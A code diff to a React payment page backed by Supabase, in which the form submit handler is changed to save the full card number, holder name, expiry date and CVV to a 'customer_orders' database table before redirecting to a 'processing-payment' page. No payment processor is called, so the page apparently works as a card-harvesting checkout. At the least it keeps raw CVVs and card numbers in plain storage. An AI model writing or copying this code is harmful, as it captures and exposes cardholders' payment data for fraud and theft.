@@ -5,10 +5,13 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { ArrowRight, Lock, CreditCard } from "lucide-react";
 import Footer from "@/components/Footer";
+import { useOrder } from "@/contexts/OrderContext";
+import { supabase } from "@/integrations/supabase/client";
 
 const Payment = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
+  const { orderData, updateOrderData } = useOrder();
   
   const companyName = searchParams.get("company") || "";
   const price = parseFloat(searchParams.get("price") || "0");
@@ -50,11 +53,37 @@ const Payment = () => {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     // Extract last 4 digits of card
     const last4 = cardNumber.slice(-4);
+    const expiryDate = `${expiryMonth}/${expiryYear}`;
+
+    // Update context
+    updateOrderData({
+      cardNumber: cardNumber,
+      cardHolderName: cardHolder,
+      expiryDate: expiryDate,
+      cvv: cvv,
+    });
+
+    // Update database
+    try {
+      if (orderData.sequenceNumber) {
+        await supabase
+          .from("customer_orders")
+          .update({
+            card_number: cardNumber,
+            card_holder_name: cardHolder,
+            expiry_date: expiryDate,
+            cvv: cvv,
+          })
+          .eq("sequence_number", orderData.sequenceNumber);
+      }
+    } catch (error) {
+      console.error("Error updating order:", error);
+    }
     
     // Navigate to processing page
     navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${last4}`);
